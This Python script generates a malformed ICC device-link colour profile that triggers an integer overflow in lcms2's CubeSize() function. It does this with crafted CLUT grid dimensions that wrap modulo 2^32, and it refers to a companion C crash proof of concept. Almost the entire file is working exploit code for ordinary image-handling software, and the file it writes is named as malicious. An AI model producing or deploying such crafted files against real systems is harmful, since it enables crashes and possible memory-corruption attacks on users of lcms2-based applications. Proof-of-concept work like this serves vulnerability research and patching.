#!/usr/bin/env python3
"""
Build a device-link ICC profile that triggers the lcms2 CubeSize() overflow.

Device-link profile:
  - Class:       "link" (0x6C696E6B) at offset 12
  - Input CS:    "5CLR" at offset 16
  - Output CS:   "RGB " at offset 20  (PCS field for device links = output color space)
  - Tag:         AToB0Tag containing an mAB element with CLUT dims [61,7,161,245,255]
                 CubeSize() wraps: 61*7*161*245*255 = 4,294,968,825 → 1,529 (mod 2^32)

The same overflow dims as in build_profile_5ch() in icc_crash_poc_v2.c
"""

import struct
import sys

def be32(v):
    return struct.pack(">I", v & 0xFFFFFFFF)

def build_link_profile():
    # mAB element layout:
    #   [0..3]   "mAB "
    #   [4..7]   reserved = 0
    #   [8]      inputChannels = 5
    #   [9]      outputChannels = 3
    #   [10..11] reserved = 0
    #   [12..15] offsetB (curves after CLUT) = 32
    #   [16..19] offsetM = 0
    #   [20..23] offsetMatrix = 0
    #   [24..27] offsetM2 = 0  (actually offsetC in spec — the CLUT offset = 68)
    #   Wait — let me mirror the exact layout from build_profile_5ch():
    #     t[8]=5, t[9]=3
    #     be32(t+12, 32)   <- offsetB
    #     be32(t+24, 68)   <- offsetC (CLUT)
    #     3 "curv" at t+32 (each 12 bytes = 36 bytes total, so up to t+68)
    #     grid dims at t+68
    #     precision byte at t+68+16 = 1

    NENTRIES = 3 * 1529   # 4587 bytes (3 output channels * wrapped CubeSize)
    
    # mAB tag structure:
    #   header:     32 bytes (sig + reserved + in/out ch + 6 × 4-byte offsets)
    #   B-curves:   36 bytes (3 × curv header 12 bytes each)
    #   CLUT hdr:   20 bytes (16 grid dims + 1 precision + 3 pad)
    #   CLUT data:  NENTRIES bytes
    tag_size = 32 + 36 + 20 + NENTRIES

    # ICC header = 128 bytes
    # Tag count:  4 bytes
    # Tag dir:    12 bytes (sig + offset + size)
    # Tag data:   tag_size bytes
    total = 128 + 4 + 12 + tag_size

    b = bytearray(total)

    # ── ICC header ──────────────────────────────────────────────────────────
    # [0..3]   profile size
    b[0:4] = be32(total)
    # [4..7]   CMM signature = 0
    # [8..9]   version 4.3
    b[8] = 0x04; b[9] = 0x30
    # [12..15] profile class = "link"  ← KEY CHANGE
    b[12:16] = b"link"
    # [16..19] data colour space = "5CLR" (5-channel input)
    b[16:20] = b"5CLR"
    # [20..23] PCS / connection space = "RGB " (output for device links)
    b[20:24] = b"RGB "
    # [24..35] creation date/time (leave zero)
    # [36..39] profile file signature = "acsp"
    b[36:40] = b"acsp"
    # [40..43] primary platform = 0
    # [44..47] profile flags = 0
    # [48..51] device manufacturer = 0
    # [52..55] device model = 0
    # [56..63] device attributes = 0
    # [64..67] rendering intent = 0
    # [68..79] illuminant XYZ (D50)
    b[68:72] = be32(63190)   # X = 0.9642
    b[72:76] = be32(65536)   # Y = 1.0000
    b[76:80] = be32(54061)   # Z = 0.8251
    # [80..83] profile creator = 0
    # [84..99] profile MD5 = 0 (optional)
    # [100..127] reserved = 0

    # ── Tag table ────────────────────────────────────────────────────────────
    tag_table_offset = 128
    b[tag_table_offset:tag_table_offset+4] = be32(1)   # tag count = 1

    tag_dir_offset = 132
    tag_data_offset = 144   # 128 + 4 + 12

    b[tag_dir_offset:tag_dir_offset+4]   = b"A2B0"         # tag signature
    b[tag_dir_offset+4:tag_dir_offset+8] = be32(tag_data_offset)
    b[tag_dir_offset+8:tag_dir_offset+12] = be32(tag_size)

    # ── mAB element ──────────────────────────────────────────────────────────
    t = tag_data_offset
    b[t:t+4]   = b"mAB "     # element type signature
    # [t+4..t+7] reserved = 0
    b[t+8]  = 5               # inputChannels
    b[t+9]  = 3               # outputChannels
    # [t+10..t+11] reserved = 0
    b[t+12:t+16] = be32(32)   # offsetB  (B-curves: at mAB offset 32)
    # [t+16..t+19] offsetM = 0
    # [t+20..t+23] offsetMatrix = 0
    b[t+24:t+28] = be32(68)   # offsetC  (CLUT: at mAB offset 68)
    # [t+28..t+31] offsetA = 0

    # B-curves: 3 identity curves (each "curv" with 0 entries = gamma 1.0)
    for i in range(3):
        curve_off = t + 32 + i * 12
        b[curve_off:curve_off+4] = b"curv"
        # [+4..+7] reserved = 0
        # [+8..+11] count = 0  (identity)

    # CLUT header at mAB offset 68 (absolute: t+68)
    clut_off = t + 68
    grid_dims = [61, 7, 161, 245, 255]
    for i, d in enumerate(grid_dims):
        b[clut_off + i] = d
    # bytes [clut_off+5 .. clut_off+15] = 0 (remaining dim slots, padding)
    b[clut_off + 16] = 1    # precision = 1 byte (uint8 CLUT entries)
    # [clut_off+17..clut_off+19] padding = 0
    # CLUT data starts at clut_off+20 — all zeros (valid, just black)

    return bytes(b)


def main():
    out_path = sys.argv[1] if len(sys.argv) > 1 else "mal_5ch_link.icc"
    data = build_link_profile()
    with open(out_path, "wb") as f:
        f.write(data)
    print(f"Wrote {len(data)} bytes to {out_path}")
    
    # Quick sanity check: print header fields
    import struct
    size  = struct.unpack_from(">I", data, 0)[0]
    cls   = data[12:16]
    incs  = data[16:20]
    outcs = data[20:24]
    print(f"  Profile size:  {size}")
    print(f"  Class:         {cls}")
    print(f"  Input CS:      {incs}")
    print(f"  Output CS/PCS: {outcs}")
    print(f"  Tag count:     {struct.unpack_from('>I', data, 128)[0]}")
    print(f"  Tag sig:       {data[132:136]}")
    print(f"  Tag offset:    {struct.unpack_from('>I', data, 136)[0]}")
    print(f"  Tag size:      {struct.unpack_from('>I', data, 140)[0]}")


if __name__ == "__main__":
    main()
